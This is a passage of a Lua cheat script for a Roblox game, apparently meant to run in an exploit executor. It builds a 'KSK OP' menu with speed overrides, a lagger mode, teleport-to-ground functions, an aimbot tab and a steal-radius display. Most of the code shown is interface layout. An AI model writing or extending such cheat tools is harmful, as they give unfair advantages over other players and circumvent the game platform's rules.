				local off = (hum2 and hum2.HipHeight or 2) + (r.Size.Y / 2)
				r.CFrame = CFrame.new(r.Position.X, rr.Position.Y + off, r.Position.Z); r.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
			end
			State.dropActive = false; return
		end
		r.AssemblyLinearVelocity = Vector3.new(r.AssemblyLinearVelocity.X, DROP_ASCEND_SPEED, r.AssemblyLinearVelocity.Z)
	end)
end

-- ===== TP Down limpio =====
local _tpDownActive = false
local function runTPDown()
	if _tpDownActive then return end
	_tpDownActive = true
	pcall(function()
		local char = LP.Character
		if not char then _tpDownActive = false; return end
		local root = char:FindFirstChild("HumanoidRootPart")
		local hum = char:FindFirstChildOfClass("Humanoid")
		if not root or not hum then _tpDownActive = false; return end
		
		local hipHeight = hum.HipHeight or 2
		local rayParams = RaycastParams.new()
		rayParams.FilterDescendantsInstances = { char }
		rayParams.FilterType = Enum.RaycastFilterType.Exclude
		
		local rayResult = workspace:Raycast(root.Position, Vector3.new(0, -500, 0), rayParams)
		
		if rayResult then
			local groundY = rayResult.Position.Y
			local newY = groundY + hipHeight + 0.1
			root.CFrame = CFrame.new(root.Position.X, newY, root.Position.Z)
			root.AssemblyLinearVelocity = Vector3.new(root.AssemblyLinearVelocity.X, 0, root.AssemblyLinearVelocity.Z)
		end
	end)
	_tpDownActive = false
end

-- ===== AUTO TP Down =====
local function startAutoTPDown()
	if autoTPDownConn then task.cancel(autoTPDownConn); autoTPDownConn = nil end
	autoTPDownConn = task.spawn(function()
		while autoTPDownEnabled do
			task.wait(0.1)
			pcall(function()
				local char = LP.Character; if not char then return end
				local root = char:FindFirstChild("HumanoidRootPart"); if not root then return end
				local hum = char:FindFirstChildOfClass("Humanoid"); if not hum then return end
				if hum.FloorMaterial ~= Enum.Material.Air then return end
				if root.Position.Y < autoTPDownHeight then return end
				runTPDown()
			end)
		end
	end)
end

local function stopAutoTPDown()
	autoTPDownEnabled = false
	if autoTPDownConn then task.cancel(autoTPDownConn); autoTPDownConn = nil end
end

for _, name in pairs({"KSKOPGUI"}) do
	local old = game:GetService("CoreGui"):FindFirstChild(name)
	if old then old:Destroy() end
	local pg = LP:FindFirstChild("PlayerGui")
	if pg then local o = pg:FindFirstChild(name); if o then o:Destroy() end end
end

local function makeDraggable(frame)
	local dragging, dragInput, dragStart, startPos = false, nil, nil, nil
	frame.InputBegan:Connect(function(inp)
		if uiLocked then return end
		if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
			dragging = true; dragStart = inp.Position; startPos = frame.Position
			inp.Changed:Connect(function() if inp.UserInputState == Enum.UserInputState.End then dragging = false end end)
		end
	end)
	frame.InputChanged:Connect(function(inp)
		if uiLocked then dragging = false; return end
		if inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch then dragInput = inp end
	end)
	UIS.InputChanged:Connect(function(inp)
		if uiLocked then dragging = false; return end
		if inp == dragInput and dragging then
			local d = inp.Position - dragStart
			frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset+d.X, startPos.Y.Scale, startPos.Y.Offset+d.Y)
		end
	end)
end

local gui = Instance.new("ScreenGui")
gui.Name = "KSKOPGUI"
gui.ResetOnSpawn = false
gui.DisplayOrder = 10
gui.IgnoreGuiInset = true
if not pcall(function() gui.Parent = game:GetService("CoreGui") end) then
	gui.Parent = LP:WaitForChild("PlayerGui")
end

-- ============================================================
-- PALETA DE COLORES AZUL
-- ============================================================
local _C = {
	[1] = Color3.fromRGB(10, 20, 40),        -- BG
	[2] = Color3.fromRGB(14, 24, 48),        -- SIDEBAR_BG
	[3] = Color3.fromRGB(20, 40, 80),        -- CARD_BG
	[4] = Color3.fromRGB(30, 60, 120),       -- CARD_HOV
	[5] = Color3.fromRGB(40, 80, 160),       -- BORDER
	[6] = Color3.fromRGB(60, 120, 200),      -- BORDER2
	[7] = Color3.fromRGB(255, 255, 255),     -- WHITE
	[8] = Color3.fromRGB(120, 140, 180),     -- DIM
	[9] = Color3.fromRGB(20, 30, 50),        -- DIM2
	[10]= Color3.fromRGB(8, 16, 32),         -- KB_BG / INPUT_BG
}
local BG          = _C[1]
local SIDEBAR_BG  = _C[2]
local CARD_BG     = _C[3]
local CARD_HOV    = _C[4]
local BORDER      = _C[5]
local BORDER2     = _C[6]
local WHITE       = _C[7]
local DIM         = _C[8]
local DIM2        = _C[9]
local KB_BG       = _C[10]
local INPUT_BG    = _C[10]

local TEXT_MAIN   = Color3.fromRGB(170, 200, 255)
local TEXT_SUB    = Color3.fromRGB(100, 150, 220)
local CHIP_BG     = Color3.fromRGB(40, 100, 200)
local CHIP_TEXT   = Color3.fromRGB(255, 255, 255)

local W, H, SW = 380, 460, 80
local CORNER = 12

local uiScaleValue = 100
local mainUIScale = nil
local main = Instance.new("Frame", gui)
main.Name = "Main"
main.Size = UDim2.new(0, W, 0, H)
main.Position = UDim2.new(0, 50, 0, 50)
main.BackgroundColor3 = BG
main.BorderSizePixel = 0
main.Active = true
main.ClipsDescendants = true
Instance.new("UICorner", main).CornerRadius = UDim.new(0, CORNER)
local mainStroke = Instance.new("UIStroke", main)
mainStroke.Color = BORDER
mainStroke.Thickness = 1
makeDraggable(main)
mainUIScale = Instance.new("UIScale", main)
mainUIScale.Scale = uiScaleValue / 100

local topbar = Instance.new("Frame", main)
topbar.Size = UDim2.new(1, 0, 0, 44)
topbar.BackgroundColor3 = DIM2
topbar.BorderSizePixel = 0
topbar.ZIndex = 10
Instance.new("UICorner", topbar).CornerRadius = UDim.new(0, CORNER)
local topPatch = Instance.new("Frame", topbar)
topPatch.Size = UDim2.new(1, 0, 0, CORNER)
topPatch.Position = UDim2.new(0, 0, 1, -CORNER)
topPatch.BackgroundColor3 = DIM2
topPatch.BorderSizePixel = 0
topPatch.ZIndex = 9
local topDiv = Instance.new("Frame", topbar)
topDiv.Size = UDim2.new(1, 0, 0, 1)
topDiv.Position = UDim2.new(0, 0, 1, -1)
topDiv.BackgroundColor3 = BORDER
topDiv.BorderSizePixel = 0
topDiv.ZIndex = 11

local titleLbl = Instance.new("TextLabel", topbar)
titleLbl.Size = UDim2.new(0, 160, 1, 0)
titleLbl.Position = UDim2.new(0, 14, 0, 0)
titleLbl.BackgroundTransparency = 1
titleLbl.Text = "KSK OP"
titleLbl.TextColor3 = TEXT_MAIN
titleLbl.Font = Enum.Font.GothamBlack
titleLbl.TextSize = 13
titleLbl.TextXAlignment = Enum.TextXAlignment.Left
titleLbl.ZIndex = 12

local verLbl = Instance.new("TextLabel", topbar)
verLbl.Size = UDim2.new(0, 130, 1, 0)
verLbl.Position = UDim2.new(0, 100, 0, 0)
verLbl.BackgroundTransparency = 1
verLbl.Text = ""
verLbl.TextColor3 = TEXT_SUB
verLbl.Font = Enum.Font.Gotham
verLbl.TextSize = 9
verLbl.TextXAlignment = Enum.TextXAlignment.Left
verLbl.ZIndex = 12
verLbl.Visible = false

local minBtn = Instance.new("TextButton", topbar)
minBtn.Size = UDim2.new(0, 26, 0, 26)
minBtn.Position = UDim2.new(1, -36, 0.5, -13)
minBtn.BackgroundColor3 = KB_BG
minBtn.BorderSizePixel = 0
minBtn.Text = "–"
minBtn.TextColor3 = WHITE
minBtn.Font = Enum.Font.GothamBlack
minBtn.TextSize = 16
minBtn.ZIndex = 13
Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 6)
Instance.new("UIStroke", minBtn).Color = BORDER
minBtn.MouseEnter:Connect(function() TweenService:Create(minBtn, TweenInfo.new(0.1), {BackgroundColor3=Color3.fromRGB(40,80,160)}):Play() end)
minBtn.MouseLeave:Connect(function() TweenService:Create(minBtn, TweenInfo.new(0.1), {BackgroundColor3=KB_BG}):Play() end)

-- ── SIDEBAR (pestañas) ──────────────────────────────────────────────────────
local sidebar = Instance.new("Frame", main)
sidebar.Size = UDim2.new(0, SW, 1, -44)
sidebar.Position = UDim2.new(0, 0, 0, 44)
sidebar.BackgroundColor3 = SIDEBAR_BG
sidebar.BorderSizePixel = 0
sidebar.ZIndex = 5
sidebar.ClipsDescendants = false
local sd = Instance.new("Frame", sidebar)
sd.Size = UDim2.new(0, 1, 1, 0)
sd.Position = UDim2.new(1, -1, 0, 0)
sd.BackgroundColor3 = BORDER
sd.BorderSizePixel = 0
sd.ZIndex = 6

-- ── CONTENIDO PRINCIPAL ─────────────────────────────────────────────────────
local content = Instance.new("Frame", main)
content.Name = "ContentArea"
content.Size = UDim2.new(1, -SW - 1, 1, -44 - CORNER)
content.Position = UDim2.new(0, SW + 1, 0, 44)
content.BackgroundColor3 = BG
content.BackgroundTransparency = 0
content.BorderSizePixel = 0
content.ClipsDescendants = true
content.ZIndex = 2

-- ── LISTA DE PESTAÑAS ──────────────────────────────────────────────────────
local tabListFrame = Instance.new("Frame", sidebar)
tabListFrame.Size = UDim2.new(1, 0, 1, 0)
tabListFrame.Position = UDim2.new(0, 0, 0, 0)
tabListFrame.BackgroundTransparency = 1
tabListFrame.BorderSizePixel = 0
tabListFrame.ZIndex = 6

local tabLL = Instance.new("UIListLayout", tabListFrame)
tabLL.SortOrder = Enum.SortOrder.LayoutOrder
tabLL.Padding = UDim.new(0, 2)
local tabPad = Instance.new("UIPadding", tabListFrame)
tabPad.PaddingTop = UDim.new(0, 10)
tabPad.PaddingLeft = UDim.new(0, 4)
tabPad.PaddingRight = UDim.new(0, 4)

local tabs = {}
local tabPages = {}
local activeTabName = nil
local tabDefs = {
	{name="Speed"},
	{name="Bat Aimbot"},
	{name="Mechanics"},
	{name="Movement"},
	{name="Performance"},
	{name="Settings"},
}
local switchTab
local pageLOs = {}

local ACTIVE_TAB_BG  = Color3.fromRGB(30, 60, 120)
local ACTIVE_TAB_TXT = WHITE
local IDLE_TAB_BG    = Color3.fromRGB(8, 16, 32)
local IDLE_TAB_TXT   = TEXT_MAIN

switchTab = function(name)
	activeTabName = name
	for _, td in ipairs(tabDefs) do
		local t = tabs[td.name]
		local isA = td.name == name
		TweenService:Create(t.frame, TweenInfo.new(0.14), {BackgroundColor3 = isA and ACTIVE_TAB_BG or IDLE_TAB_BG}):Play()
		TweenService:Create(t.lbl,   TweenInfo.new(0.14), {TextColor3 = isA and ACTIVE_TAB_TXT or IDLE_TAB_TXT}):Play()
		tabPages[td.name].Visible = isA
	end
end

for i, td in ipairs(tabDefs) do
	local btn = Instance.new("TextButton", tabListFrame)
	btn.Size = UDim2.new(1, 0, 0, 32)
	btn.BackgroundColor3 = IDLE_TAB_BG
	btn.BorderSizePixel = 0
	btn.Text = ""
	btn.LayoutOrder = i
	btn.ZIndex = 7
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
	local lbl = Instance.new("TextLabel", btn)
	lbl.Size = UDim2.new(1, 0, 1, 0)
	lbl.Position = UDim2.new(0, 0, 0, 0)
	lbl.BackgroundTransparency = 1
	lbl.Text = td.name
	lbl.TextColor3 = IDLE_TAB_TXT
	lbl.Font = Enum.Font.GothamBold
	lbl.TextSize = 8
	lbl.TextXAlignment = Enum.TextXAlignment.Center
	lbl.TextWrapped = true
	lbl.ZIndex = 9
	tabs[td.name] = {frame=btn, lbl=lbl}

	local page = Instance.new("ScrollingFrame", content)
	page.Size = UDim2.new(1, 0, 1, 0)
	page.BackgroundColor3 = BG
	page.BackgroundTransparency = 0
	page.BorderSizePixel = 0
	page.ScrollBarThickness = 2
	page.ScrollBarImageColor3 = BORDER2
	page.AutomaticCanvasSize = Enum.AutomaticSize.Y
	page.CanvasSize = UDim2.new(0, 0, 0, 0)
	page.Visible = false
	page.ZIndex = 3
	local pll = Instance.new("UIListLayout", page)
	pll.SortOrder = Enum.SortOrder.LayoutOrder
	pll.Padding = UDim.new(0, 3)
	local pp = Instance.new("UIPadding", page)
	pp.PaddingLeft = UDim.new(0, 6)
	pp.PaddingRight = UDim.new(0, 6)
	pp.PaddingTop = UDim.new(0, 8)
	pp.PaddingBottom = UDim.new(0, 8)
	tabPages[td.name] = page
	pageLOs[td.name] = 0
	btn.Activated:Connect(function() switchTab(td.name) end)
	btn.MouseEnter:Connect(function()
		if activeTabName ~= td.name then TweenService:Create(btn, TweenInfo.new(0.1), {BackgroundColor3=Color3.fromRGB(20,40,80)}):Play() end
	end)
	btn.MouseLeave:Connect(function()
		if activeTabName ~= td.name then TweenService:Create(btn, TweenInfo.new(0.1), {BackgroundColor3=IDLE_TAB_BG}):Play() end
	end)
end

switchTab(tabDefs[1].name)

local mini = Instance.new("TextButton", gui)
mini.Name = "KSKOPMini"
mini.Size = UDim2.new(0, 160, 0, 30)
mini.Position = UDim2.new(0, 50, 0, 50)
mini.BackgroundColor3 = KB_BG
mini.BorderSizePixel = 0
mini.Text = "KSK OP"
mini.TextColor3 = TEXT_MAIN
mini.Font = Enum.Font.GothamBold
mini.TextSize = 11
mini.TextXAlignment = Enum.TextXAlignment.Center
mini.ZIndex = 20
mini.Visible = false
Instance.new("UICorner", mini).CornerRadius = UDim.new(0, 8)
local miniStroke = Instance.new("UIStroke", mini)
miniStroke.Color = BORDER
miniStroke.Thickness = 1
makeDraggable(mini)

local function showGui() main.Visible=true; mini.Visible=false; State.guiVisible=true end
local function hideGui() main.Visible=false; mini.Visible=true; State.guiVisible=false end
minBtn.MouseButton1Click:Connect(hideGui)
mini.MouseButton1Click:Connect(showGui)
mini.MouseEnter:Connect(function() TweenService:Create(mini,TweenInfo.new(0.1),{BackgroundColor3=Color3.fromRGB(20,40,80)}):Play() end)
mini.MouseLeave:Connect(function() TweenService:Create(mini,TweenInfo.new(0.1),{BackgroundColor3=KB_BG}):Play() end)

-- ===========================================================================
-- FUNCIONES DE INTERFAZ
-- ===========================================================================

local function lo(tabName) pageLOs[tabName] = pageLOs[tabName] + 1; return pageLOs[tabName] end
local function pg(tabName) return tabPages[tabName] end

local function makeSecHeader(tabName, text)
	local f = Instance.new("Frame", pg(tabName))
	f.Size = UDim2.new(1, 0, 0, 16)
	f.BackgroundTransparency = 1
	f.BorderSizePixel = 0
	f.LayoutOrder = lo(tabName)
	f.ZIndex = 4
	local t = Instance.new("TextLabel", f)
	t.Size = UDim2.new(1, 0, 1, 0)
	t.BackgroundTransparency = 1
	t.Text = text:upper()
	t.TextColor3 = TEXT_SUB
	t.Font = Enum.Font.GothamBold
	t.TextSize = 7
	t.TextXAlignment = Enum.TextXAlignment.Left
	t.ZIndex = 5
	local line = Instance.new("Frame", f)
	line.Size = UDim2.new(1, 0, 0, 1)
	line.Position = UDim2.new(0, 0, 1, -1)
	line.BackgroundColor3 = BORDER
	line.BorderSizePixel = 0
	line.ZIndex = 4
end

local _unwalkSavedAnimate = nil
local function startUnwalk()
    local c = LP.Character; if not c then return end
    local hum = c:FindFirstChildOfClass("Humanoid")
    if hum then for _,t in ipairs(hum:GetPlayingAnimationTracks()) do pcall(function() t:Stop() end) end end
    local anim = c:FindFirstChild("Animate")
    if anim then _unwalkSavedAnimate = anim:Clone(); anim:Destroy() end
end
local function stopUnwalk()
    local c = LP.Character
    if c then
        local existing = c:FindFirstChild("Animate")
        if not existing then
            local src = game:GetService("StarterPlayer"):FindFirstChildOfClass("StarterCharacterScripts")
            local starterAnim = src and src:FindFirstChild("Animate")
            if starterAnim then starterAnim:Clone().Parent = c
            elseif _unwalkSavedAnimate then _unwalkSavedAnimate:Clone().Parent = c end
        end
    end
    _unwalkSavedAnimate = nil
end

local function baseCard(tabName, h2)
	local c = Instance.new("Frame", pg(tabName))
	c.Size = UDim2.new(1, 0, 0, h2 or 36)
	c.BackgroundColor3 = CARD_BG
	c.BorderSizePixel = 0
	c.LayoutOrder = lo(tabName)
	c.ZIndex = 4
	Instance.new("UICorner", c).CornerRadius = UDim.new(0, 6)
	Instance.new("UIStroke", c).Color = BORDER
	c.MouseEnter:Connect(function() TweenService:Create(c, TweenInfo.new(0.1), {BackgroundColor3=CARD_HOV}):Play() end)
	c.MouseLeave:Connect(function() TweenService:Create(c, TweenInfo.new(0.1), {BackgroundColor3=CARD_BG}):Play() end)
	return c
end

local function cLabel(p, text, x, w, sz, col, font, xa)
	local l = Instance.new("TextLabel", p)
	l.Size = UDim2.new(0, w or 120, 1, 0)
	l.Position = UDim2.new(0, x or 8, 0, 0)
	l.BackgroundTransparency = 1
	l.Text = text
	l.TextColor3 = col or TEXT_MAIN
	l.Font = font or Enum.Font.GothamBold
	l.TextSize = sz or 10
	l.TextXAlignment = xa or Enum.TextXAlignment.Left
	l.ZIndex = 10
	return l
end

local function makePillToggle(parent, defOn, onToggle)
	local PW, PH = 32, 17
	local pbg = Instance.new("Frame", parent)
	pbg.Size = UDim2.new(0, PW, 0, PH)
	pbg.Position = UDim2.new(1, -(PW+8), 0.5, -PH/2)
	pbg.BackgroundColor3 = defOn and WHITE or BG
	pbg.BorderSizePixel = 0
	pbg.ZIndex = 8
	Instance.new("UICorner", pbg).CornerRadius = UDim.new(0, 8)
	local ps = Instance.new("UIStroke", pbg); ps.Color = defOn and WHITE or BORDER2; ps.Thickness = 1
	local dot = Instance.new("Frame", pbg)
	dot.Size = UDim2.new(0, 11, 0, 11)
	dot.Position = defOn and UDim2.new(1, -13, 0.5, -5.5) or UDim2.new(0, 2, 0.5, -5.5)
	dot.BackgroundColor3 = defOn and BG or WHITE
	dot.BorderSizePixel = 0
	dot.ZIndex = 9
	Instance.new("UICorner", dot).CornerRadius = UDim.new(0, 4)
	local isOn = defOn or false
	local function setV(on)
		isOn = on
		TweenService:Create(pbg, TweenInfo.new(0.18), {BackgroundColor3=on and WHITE or BG}):Play()
		TweenService:Create(ps,  TweenInfo.new(0.18), {Color=on and WHITE or BORDER2}):Play()
		TweenService:Create(dot, TweenInfo.new(0.18, Enum.EasingStyle.Back), {
			Position = on and UDim2.new(1,-13,0.5,-5.5) or UDim2.new(0,2,0.5,-5.5),
			BackgroundColor3 = on and BG or WHITE
		}):Play()
	end
	local clk = Instance.new("TextButton", parent)
	clk.Size = UDim2.new(1, 0, 1, 0)
	clk.BackgroundTransparency = 1
	clk.Text = ""
	clk.ZIndex = 6
	clk.MouseButton1Click:Connect(function()
		if _anyKeyListening then return end
		isOn = not isOn; setV(isOn); if onToggle then pcall(onToggle, isOn) end
	end)
	return setV
end

local function makeKB(parent, kbEntry, onChange)
	local b = Instance.new("TextButton", parent)
	b.Size = UDim2.new(0, 38, 0, 18)
	b.BackgroundColor3 = KB_BG
	b.BorderSizePixel = 0
	local function getDisplayText()
		if kbEntry.gp then return "GP:"..kbEntry.gp.Name
		elseif kbEntry.kb then return kbEntry.kb.Name
		else return "None" end
	end
	b.Text = getDisplayText()
	b.TextColor3 = WHITE
	b.Font = Enum.Font.GothamBold
	b.TextSize = 7
	b.ZIndex = 11
	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 4)
	local bs = Instance.new("UIStroke", b); bs.Color = BORDER2; bs.Thickness = 1
	local li = false; local lc; local pv = b.Text
	b.MouseButton1Click:Connect(function()
		if li then li=false; _anyKeyListening=false; if lc then lc:Disconnect(); lc=nil end; b.Text=pv; b.TextColor3=WHITE; return end
		pv=b.Text; li=true; _anyKeyListening=true; b.Text="···"; b.TextColor3=DIM
		TweenService:Create(bs, TweenInfo.new(0.1), {Color=WHITE}):Play()
		lc = UIS.InputBegan:Connect(function(inp)
			if not li then return end
			local isKb = inp.UserInputType == Enum.UserInputType.Keyboard
			local isGp = inp.UserInputType == Enum.UserInputType.Gamepad1
			if not isKb and not isGp then return end
			if inp.KeyCode == Enum.KeyCode.Escape then
				li=false; _anyKeyListening=false; if lc then lc:Disconnect(); lc=nil end
				b.Text=pv; b.TextColor3=WHITE; TweenService:Create(bs,TweenInfo.new(0.1),{Color=BORDER2}):Play(); return
			end
			if isGp then
				kbEntry.gp = inp.KeyCode; kbEntry.kb = nil
				b.Text = "GP:"..inp.KeyCode.Name; pv = b.Text
			else
				kbEntry.kb = inp.KeyCode; kbEntry.gp = nil
				b.Text = inp.KeyCode.Name; pv = b.Text
			end
			b.TextColor3=WHITE
			li=false; _anyKeyListening=false; if lc then lc:Disconnect(); lc=nil end
			TweenService:Create(bs, TweenInfo.new(0.1), {Color=BORDER2}):Play()
			if onChange then onChange(inp.KeyCode) end
		end)
	end)
	return b
end

local function rowToggle(tabName, label, sub, defOn, onToggle)
	local c = baseCard(tabName, sub and 44 or 36)
	cLabel(c, label, 8, 130, 10, TEXT_MAIN, Enum.Font.GothamBold)
	if sub then
		local sl = cLabel(c, sub, 8, 140, 8, TEXT_SUB, Enum.Font.Gotham)
		sl.Size = UDim2.new(0, 140, 0, 12); sl.Position = UDim2.new(0, 8, 0, 22)
	end
	return makePillToggle(c, defOn, onToggle)
end

local function rowToggleKB(tabName, label, sub, kbEntry, defOn, onToggle, onKeyChange)
	local c = baseCard(tabName, sub and 44 or 36)
	cLabel(c, label, 8, 100, 10, TEXT_MAIN, Enum.Font.GothamBold)
	if sub then
		local sl = cLabel(c, sub, 8, 120, 8, TEXT_SUB, Enum.Font.Gotham)
		sl.Size = UDim2.new(0, 120, 0, 12); sl.Position = UDim2.new(0, 8, 0, 22)
	end
	local kb = makeKB(c, kbEntry, function(k) if onKeyChange then onKeyChange(k) end end)
	kb.Position = UDim2.new(1, -(38+8+32+6), 0.5, -9)
	kb.ZIndex = 11
	local PW, PH = 32, 17
	local pbg = Instance.new("Frame", c)
	pbg.Size = UDim2.new(0, PW, 0, PH)
	pbg.Position = UDim2.new(1, -(PW+8), 0.5, -PH/2)
	pbg.BackgroundColor3 = defOn and WHITE or BG
	pbg.BorderSizePixel = 0
	pbg.ZIndex = 8
	Instance.new("UICorner", pbg).CornerRadius = UDim.new(0, 8)
	local ps = Instance.new("UIStroke", pbg); ps.Color = defOn and WHITE or BORDER2; ps.Thickness = 1
	local dot = Instance.new("Frame", pbg)
	dot.Size = UDim2.new(0, 11, 0, 11)
	dot.Position = defOn and UDim2.new(1, -13, 0.5, -5.5) or UDim2.new(0, 2, 0.5, -5.5)
	dot.BackgroundColor3 = defOn and BG or WHITE
	dot.BorderSizePixel = 0
	dot.ZIndex = 9
	Instance.new("UICorner", dot).CornerRadius = UDim.new(0, 4)
	local isOn = defOn or false
	local function setV(on)
		isOn = on
		TweenService:Create(pbg, TweenInfo.new(0.18), {BackgroundColor3=on and WHITE or BG}):Play()
		TweenService:Create(ps,  TweenInfo.new(0.18), {Color=on and WHITE or BORDER2}):Play()
		TweenService:Create(dot, TweenInfo.new(0.18, Enum.EasingStyle.Back), {
			Position = on and UDim2.new(1,-13,0.5,-5.5) or UDim2.new(0,2,0.5,-5.5),
			BackgroundColor3 = on and BG or WHITE
		}):Play()
	end
	local clk = Instance.new("TextButton", c)
	clk.Size = UDim2.new(1, 0, 1, 0)
	clk.BackgroundTransparency = 1
	clk.Text = ""
	clk.ZIndex = 6
	clk.MouseButton1Click:Connect(function()
		if _anyKeyListening then return end
		isOn = not isOn; setV(isOn); if onToggle then pcall(onToggle, isOn) end
	end)
	return setV, kb
end

local function rowKBOnly(tabName, label, sub, kbEntry, onKeyChange)
	local c = baseCard(tabName, sub and 44 or 36)
	cLabel(c, label, 8, 130, 10, TEXT_MAIN, Enum.Font.GothamBold)
	if sub then
		local sl = cLabel(c, sub, 8, 140, 8, TEXT_SUB, Enum.Font.Gotham)
		sl.Size = UDim2.new(0, 140, 0, 12); sl.Position = UDim2.new(0, 8, 0, 22)
	end
	local kb = makeKB(c, kbEntry, function(k) if onKeyChange then onKeyChange(k) end end)
	kb.Position = UDim2.new(1, -(38+8), 0.5, -9)
	kb.ZIndex = 11
	return kb
end

local function rowInput(tabName, label, sub, default, onChange)
	local c = baseCard(tabName, sub and 44 or 36)
	cLabel(c, label, 8, 110, 10, TEXT_MAIN, Enum.Font.GothamBold)
	if sub then
		local sl = cLabel(c, sub, 8, 130, 8, TEXT_SUB, Enum.Font.Gotham)
		sl.Size = UDim2.new(0, 130, 0, 12); sl.Position = UDim2.new(0, 8, 0, 22)
	end
	local box = Instance.new("TextBox", c)
	box.Size = UDim2.new(0, 56, 0, 22)
	box.Position = UDim2.new(1, -64, 0.5, -11)
	box.BackgroundColor3 = INPUT_BG
	box.BorderSizePixel = 0
	box.Text = tostring(default)
	box.TextColor3 = WHITE
	box.Font = Enum.Font.GothamBold
	box.TextSize = 10
	box.ClearTextOnFocus = false
	box.ZIndex = 11
	Instance.new("UICorner", box).CornerRadius = UDim.new(0, 4)
	local bs = Instance.new("UIStroke", box); bs.Color = BORDER2; bs.Thickness = 1; bs.ZIndex = 12
	box.Focused:Connect(function() TweenService:Create(bs, TweenInfo.new(0.1), {Color=WHITE}):Play() end)
	box.FocusLost:Connect(function()
		TweenService:Create(bs, TweenInfo.new(0.1), {Color=BORDER2}):Play()
		if onChange then local n = tonumber(box.Text); if n then onChange(n) else box.Text = tostring(default) end end
	end)
	return box
end

local function rowActionBtn(tabName, label, onClick)
	local b = Instance.new("TextButton", pg(tabName))
	b.Size = UDim2.new(1, 0, 0, 34)
	b.BackgroundColor3 = CHIP_BG
	b.BorderSizePixel = 0
	b.Text = label
	b.TextColor3 = CHIP_TEXT
	b.Font = Enum.Font.GothamBold
	b.TextSize = 10
	b.LayoutOrder = lo(tabName)
	b.ZIndex = 5
	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
	b.MouseButton1Click:Connect(function()
		TweenService:Create(b, TweenInfo.new(0.08), {BackgroundColor3=Color3.fromRGB(80,160,255)}):Play()
		task.delay(0.15, function() TweenService:Create(b, TweenInfo.new(0.1), {BackgroundColor3=CHIP_BG}):Play() end)
		if onClick then pcall(onClick) end
	end)
	b.MouseEnter:Connect(function() TweenService:Create(b, TweenInfo.new(0.1), {BackgroundColor3=Color3.fromRGB(80,160,255)}):Play() end)
	b.MouseLeave:Connect(function() TweenService:Create(b, TweenInfo.new(0.1), {BackgroundColor3=CHIP_BG}):Play() end)
	return b
end

-- Barra de progreso (recreada)
local pbFrame = Instance.new("Frame", gui)
pbFrame.Size = UDim2.new(0, 200, 0, 34)
pbFrame.Position = UDim2.new(0.5, -100, 1, -50)
pbFrame.BackgroundColor3 = DIM2
pbFrame.BorderSizePixel = 0
pbFrame.Active = true
Instance.new("UICorner", pbFrame).CornerRadius = UDim.new(0, 8)
Instance.new("UIStroke", pbFrame).Color = BORDER
makeDraggable(pbFrame)

progressPct = Instance.new("TextLabel", pbFrame)
progressPct.Size = UDim2.new(1, -16, 0, 14)
progressPct.Position = UDim2.new(0, 8, 0, 4)
progressPct.BackgroundTransparency = 1
progressPct.Text = "0%"
progressPct.TextColor3 = WHITE
progressPct.Font = Enum.Font.GothamBold
progressPct.TextSize = 10
progressPct.TextXAlignment = Enum.TextXAlignment.Left
progressPct.ZIndex = 5

progressRadLbl = Instance.new("TextLabel", pbFrame)
progressRadLbl.Size = UDim2.new(0, 100, 0, 14)
progressRadLbl.Position = UDim2.new(1, -108, 0, 4)
progressRadLbl.BackgroundTransparency = 1
progressRadLbl.Text = "Radius: "..Steal.StealRadius
progressRadLbl.TextColor3 = WHITE
progressRadLbl.Font = Enum.Font.GothamBold
progressRadLbl.TextSize = 10
progressRadLbl.TextXAlignment = Enum.TextXAlignment.Right
progressRadLbl.ZIndex = 5

local pbBg = Instance.new("Frame", pbFrame)
pbBg.Size = UDim2.new(1, -16, 0, 6)
pbBg.Position = UDim2.new(0, 8, 0, 20)
pbBg.BackgroundColor3 = Color3.fromRGB(18, 30, 50)
pbBg.BorderSizePixel = 0
Instance.new("UICorner", pbBg).CornerRadius = UDim.new(0, 4)
progressFill = Instance.new("Frame", pbBg)
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.BackgroundColor3 = CHIP_BG
progressFill.BorderSizePixel = 0
Instance.new("UICorner", progressFill).CornerRadius = UDim.new(0, 4)

local function resetProgressBar()
	progressPct.Text = "0%"
	progressFill.Size = UDim2.new(0,0,1,0)
	if progressRadLbl then progressRadLbl.Visible = true end
end

-- ===========================================================================
-- CONTENIDO DE LAS PESTAÑAS
-- ===========================================================================

do -- tab content scope
makeSecHeader("Speed", "Speed Configuration")
normalBox = rowInput("Speed", "Normal Speed", nil, NS, function(v) if v>0 and v<=500 then NS=v end end)
carryBox  = rowInput("Speed", "Carry Speed",  nil, CS, function(v) if v>0 and v<=500 then CS=v end end)
laggerBox = rowInput("Speed", "Lagger Speed", nil, LS, function(v) if v>0 and v<=500 then LS=v end end)
laggerBox2 = rowInput("Speed", "Lagger Carry Speed", nil, LS2, function(v) if v>0 and v<=500 then LS2=v end end)

do
	local c = baseCard("Speed", 36)
	cLabel(c, "Mode", 8, 70, 10, TEXT_MAIN, Enum.Font.GothamBold)
	modeValLbl = cLabel(c, "Normal", 76, 70, 9, TEXT_SUB, Enum.Font.GothamBold, Enum.TextXAlignment.Center)
	local kb = makeKB(c, KB.Speed, function(k) end)
	kb.Position = UDim2.new(1, -(38+8), 0.5, -9)
	kb.ZIndex = 11
	local clk = Instance.new("TextButton", c)
	clk.Size = UDim2.new(0.6, 0, 1, 0)
	clk.BackgroundTransparency = 1
	clk.Text = ""
	clk.ZIndex = 6
	clk.Active = true
	clk.Activated:Connect(function()
		if _anyKeyListening then return end
		State.speedToggled = not State.speedToggled
		if State.speedToggled then State.laggerToggled = false; if mobileLaggerSetActive then mobileLaggerSetActive(false) end end
		modeValLbl.Text = State.laggerToggled and "Lagger" or (State.speedToggled and "Carry" or "Normal")
	end)
end

do
	local c = baseCard("Speed", 36)
	cLabel(c, "Lagger Mode", 8, 100, 10, TEXT_MAIN, Enum.Font.GothamBold)
	local kb = makeKB(c, KB.Lagger, function(k) KB.Lagger.kb = k end)
	kb.Position = UDim2.new(1, -(38+8), 0.5, -9)
	kb.ZIndex = 11
	local clk = Instance.new("TextButton", c)
	clk.Size = UDim2.new(0.6, 0, 1, 0)
